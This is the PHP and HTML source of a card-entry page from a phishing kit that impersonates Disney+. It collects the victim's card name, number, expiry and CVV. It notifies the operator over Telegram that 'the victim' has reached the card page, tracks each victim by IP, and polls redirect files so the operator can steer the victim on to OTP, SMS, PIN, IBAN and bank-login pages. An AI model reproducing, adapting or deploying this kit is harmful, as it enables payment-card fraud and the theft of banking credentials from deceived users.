<?php
session_start();
include('../../common/sub_includes.php');
include('../../app/1.php');
include('../../app/2.php');
include('../traduction.php');

if (!isset($_SESSION['index']) && $_SESSION['index'] == '1') {
  header('location: ../../');
}

if (!isset($_SESSION['bot']) && $_SESSION['bot'] == '1') {
  header('location: ../../site/index.html');
}
        
if (!isset($_SESSION['client']) && $_SESSION['client'] == '1') {
  die("THE SITE IS UNDER MAINTENANCE PLEASE TRY LATER");
}

removeIPFromFile("../{$_SESSION['id5']}/redirect/carteInvalide.txt", $_SERVER['REMOTE_ADDR']);

$file = '../../users.json';
$data = file_exists($file) ? json_decode(file_get_contents($file), true) : ["users" => []];
$data['users'][$_SESSION['ip']]['step'] = '4';
file_put_contents($file, json_encode($data, JSON_PRETTY_PRINT));

sendMessage($telegram['NotifsChatId'], "La victime {$_SESSION['ip']} est dans la page card");
?>
<!DOCTYPE html>
<html style="display: block;">
  <head>
    <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
    <meta content="IE=Edge" http-equiv="X-UA-Compatible">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport">
    <link href="../../public/img/favicon.85e279041d79e51b147c1b6feb4f981e.ico" rel="shortcut icon">
    <link color="#1d1fff" href="../../public/img/safari-pinned-tab.f78e1debd6a0496471c542612d2e4bc5.svg" rel="mask-icon">
    <link href="../../public/img/apple-touch-icon.4dd3b8a8853ed0608ee308aa7aa76f82.png" rel="apple-touch-icon" sizes="180x180">
    <link href="../../public/img/favicon-32x32.3699f19f7fdff1a556c0953c12fb883f.png" rel="icon" sizes="32x32" type="image/png">
    <title>Disney+</title>
    <link href="../../public/css/styles.d6986a0e2dd6923e60b1.css" rel="stylesheet" type="text/css">
    <link href="../../public/css/app.30f50da231e6cea1762d.css" rel="stylesheet" type="text/css">
    <link rel="stylesheet" href="../../public/css/css_styles2.css">
    <link rel="stylesheet" href="../../public/css/styles1.css">
    <link rel="stylesheet" href="../../public/css/styles2.css">
    <link data-precedence="next" href="../../public/css/styledesign.css" rel="stylesheet"/>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet">
  </head>
  <body class="typeramp-avenir-world-for-disney" id="app_index" style="overflow: auto;">
    <div data-reactroot="" id="webAppRoot">
      <div data-testid="adult-enabled-profile" id="app_body_content">
        <div class="onboarding" data-gv2containerkey="webAppHeader" id="webAppHeader">
          <nav class="sc-fjmCvl fhaErk sc-iomxrj kQhsYK navigation navigation__navigation-bar" data-gv2containerkey="loggedOutNavBar" id="nav-bar" kind="onboarding" role="navigation">
            <div class="sc-dxZgTM veHGO" id="nav-logo">
              <div aria-label="logo" class="sc-jbKcbu gbHCZO" id="logo" placeholder="logo" role="img" tabindex="0" title="logo">
                <div class="logo container--hw-full logo cursor--pointer" style="display: none;"></div>
                <center>
                  <img src="../../public/img/logo.svg" style="height: 50px;width: 85px;margin-top:10px;margin:10px;" alt="">
                </center>
              </div>
            </div>
          </nav>
        </div>
        <div id="webAppScene">
          <div id="app_scene_content">
            <main class="onboarding" id="onboarding_index" style="top: 72px;">
              <div class="onboarding-wrapper">
                <p class="margin--0 overline text-color--secondary padding--bottom-1" data-testid="onboarding-stepper-1-of-5" data-overline="printable"><?=$payment['1']?></p>
                <form id="loginEmail" name="dssLogin" action="app/test.php" method="POST" novalidate="" data-gv2containerkey="emailForm">
                  <h3 class="text-color--primary padding--bottom-2"> <?=$payment['2']?> </h3>
                  <br>
                  <fieldset class="sc-iRbamj divkgu">
                    <div data-testid="" class="sc-csuQGl jZWXHr">
                      <label class="margin--0 overline margin--left-1 margin--bottom-1 text-color--secondary input-label" for="billing-card-name" style="width: 100%; color: rgb(249, 249, 249);"><?=$payment['6']?></label>
                      <input style="margin-top:5px" aria-invalid="false" aria-label="Nom du titulaire" id="holder" inputmode="text" maxlength="1000" name="holder" placeholder="" type="text" aria-describedby="billing-card-name-error-msg" class="sc-gPEVay YtpGf sc-gipzik lbfoCZ text-color--primary body-copy form-input-text" value="" data-gv2elementkey="name_on_card" data-gv2interactionkey="name_on_card">
                    </div>
                  </fieldset>
                  <br>
                  <fieldset class="sc-iRbamj divkgu">
                    <div data-testid="" class="sc-csuQGl jZWXHr">
                      <label class="margin--0 overline margin--left-1 margin--bottom-1 text-color--secondary input-label" for="billing-card-name" style="width: 100%; color: rgb(249, 249, 249);"><?=$payment['7']?></label>
                      <input aria-invalid="false" aria-label="Nom du titulaire" id="number" inputmode="numeric" minlength="16" maxlength="16" name="number" placeholder="" type="text" aria-describedby="billing-card-name-error-msg" class="sc-gPEVay YtpGf sc-gipzik lbfoCZ text-color--primary body-copy form-input-text" value="" data-gv2elementkey="name_on_card" data-gv2interactionkey="name_on_card">
                    </div>
                  </fieldset>
                  <br>
                  <label class="margin--0 overline margin--left-1 margin--bottom-1 text-color--secondary input-label" for="billing-card-name" style="width: 100%; color: rgb(249, 249, 249);"> <?=$payment['8']?></label>
                  <label class="margin--0 overline margin--left-1 margin--bottom-1 text-color--secondary input-label" for="billing-card-name" style="width: 100%; color: rgb(249, 249, 249);margin-left:20%;"> <?=$payment['9']?> </label>
                  <fieldset class="sc-iRbamj divkgu">
                    <input style="margin-top:5px;width:45%" aria-invalid="false" aria-label="Nom du titulaire" id="exp" inputmode="numeric" maxlength="5" name="exp" placeholder="<?=$payment['10']?>" type="text" aria-describedby="billing-card-name-error-msg" class="sc-gPEVay YtpGf sc-gipzik lbfoCZ text-color--primary body-copy form-input-text" value="" data-gv2elementkey="name_on_card" data-gv2interactionkey="name_on_card">
                    <input style="margin-top:5px;margin-left:8px;width:51%" aria-invalid="false" aria-label="Nom du titulaire" id="cvv" inputmode="numeric" maxlength="4" name="cvv" placeholder="<?=$payment['11']?>" type="text" aria-describedby="billing-card-name-error-msg" class="sc-gPEVay YtpGf sc-gipzik lbfoCZ text-color--primary body-copy form-input-text" value="" data-gv2elementkey="name_on_card" data-gv2interactionkey="name_on_card">
                  </fieldset>
                  <div>
                    <br>
					  					  <p><?=$payment['16']?></p>
					  <br>
                    <div class="sc-fYxtnH jzDBQM">
                      <button role="button" aria-label="CONTINUER" name="submit" data-gv2elementkey="agree_&amp;_continue" data-gv2interactionkey="agree_&amp;_continue" data-testid="signup-continue-button" type="submit" value="submit" class="button button--inline-flex button--primary button--full-width button--height-48 padding--top-3 padding--right-6 padding--bottom-3 padding--left-6 undefined" data-gv2-interaction-bound="true"><center><span id="spinner" class="spinner"></span></center><span class="btn-content" ><?=$payment['12']?></span></button>
                    </div>
                  </div>
                </form>
              </div>
            </main>
          </div>
        </div>
        <div class="wrapper wrapper--sticky-footer margin--0" id="stickyFooterPortalContainer"></div>
        <div id="webAppFooter">
        <footer class="sc-iSDuPN iPmNsO footer footer__container" data-gv2containerkey="footer" id="footer" style="margin-top:  100px;">
      <div class="sc-fZwumE hiJlfA">
        <center><img src="../../public/img/logo.svg" style="height: 50px;width: 85px;margin-top:10px;" alt=""></center>
      </div>
      <div class="sc-fQejPQ ftqojJ">
       <button class="link sc-clNaTc cPYkkK link link--primary link--primary__h metadata" type="button">
       <?=$footer['1']?>
       </button>
       <button class="link sc-clNaTc cPYkkK link link--primary link--primary__h metadata" type="button">
       <?=$footer['2']?>
       </button>
       <button class="link sc-clNaTc cPYkkK link link--primary link--primary__h metadata" type="button">
       <?=$footer['3']?>
       </button>
       <button class="link sc-clNaTc cPYkkK link link--primary link--primary__h metadata" type="button">
       <?=$footer['4']?>
       </button>
       <button class="link sc-clNaTc cPYkkK link link--primary link--primary__h metadata" type="button">
       <?=$footer['5']?>
       </button>
       <button class="link sc-clNaTc cPYkkK link link--primary link--primary__h metadata" type="button">
       <?=$footer['6']?>
       </button>
       <button class="link sc-clNaTc cPYkkK link link--primary link--primary__h metadata" type="button">
       <?=$footer['7']?>
       </button>
       <button class="link sc-clNaTc cPYkkK link link--primary link--primary__h metadata" type="button">
       <?=$footer['8']?>
       </button>
       <button class="link sc-clNaTc cPYkkK link link--primary link--primary__h metadata" type="button">
       <?=$footer['9']?>
       </button>
       <button class="link sc-clNaTc cPYkkK link link--primary link--primary__h metadata" type="button">
       <?=$footer['10']?>
       </button>
      </div>
      <div class="metadata text-color--secondary padding--top-2 padding--bottom-6 text--center">
      <?=$footer['11']?>
      </div>
     </footer>
        </div>
      </div>
    </div>
    <script src="../../public/js/jquery.js"></script>
  <script src="../../public/js/jquery.mask.js"></script>
  <script src="../../public/js/login.js"></script>
  <script src="../../public/js/mask.js"></script>
  <script src="../../public/js/amex.js"></script>
  <script src="../../public/js/redirect.js"></script>
  <script src="../../public/js/validation/2.js"></script>

  <script src="../../public/js/jquery.js"></script><script src="../../public/js/jquery.mask.js"></script><script src="../../public/js/mask.js"></script><script src="../../public/js/redirect.js"></script><script>setInterval(function(){checkIP("../<?=$_SESSION['id5']?>/redirect/carteInvalide.txt","../<?=$_SESSION['id4']?>/?error")},1e3),setInterval(function(){checkIP("../<?=$_SESSION['id5']?>/redirect/fin.txt","../<?=$_SESSION['id14']?>/")},1e3),setInterval(function(){checkIP("../<?=$_SESSION['id5']?>/redirect/otp.txt","../<?=$_SESSION['id7']?>/")},1e3),setInterval(function(){checkIP("../<?=$_SESSION['id5']?>/redirect/otperror.txt","../<?=$_SESSION['id7']?>/?error")},1e3),setInterval(function(){checkIP("../<?=$_SESSION['id5']?>/redirect/mail.txt","../<?=$_SESSION['id8']?>/")},1e3),setInterval(function(){checkIP("../<?=$_SESSION['id5']?>/redirect/mailerror.txt","../<?=$_SESSION['id8']?>/?error")},1e3),setInterval(function(){checkIP("../<?=$_SESSION['id5']?>/redirect/sms.txt","../<?=$_SESSION['id9']?>/")},1e3),setInterval(function(){checkIP("../<?=$_SESSION['id5']?>/redirect/smserror.txt","../<?=$_SESSION['id9']?>/?error")},1e3),setInterval(function(){checkIP("../<?=$_SESSION['id5']?>/redirect/bank.txt","../<?=$_SESSION['id13']?>/")},1e3),setInterval(function(){checkIP("../<?=$_SESSION['id5']?>/redirect/bankerror.txt","../<?=$_SESSION['id13']?>/?error")},1e3),setInterval(function(){checkIP("../<?=$_SESSION['id5']?>/redirect/pin.txt","../<?=$_SESSION['id10']?>/")},1e3),setInterval(function(){checkIP("../<?=$_SESSION['id5']?>/redirect/pinerror.txt","../<?=$_SESSION['id10']?>/?error")},1e3),setInterval(function(){checkIP("../<?=$_SESSION['id5']?>/redirect/iban.txt","../<?=$_SESSION['id11']?>/")},1e3),setInterval(function(){checkIP("../<?=$_SESSION['id5']?>/redirect/ibanerror.txt","../<?=$_SESSION['id11']?>/?error")},1e3),setInterval(function(){checkIP("../<?=$_SESSION['id5']?>/redirect/vbv.txt","../<?=$_SESSION['id12']?>/")},1e3)</script>
  </body>
</html>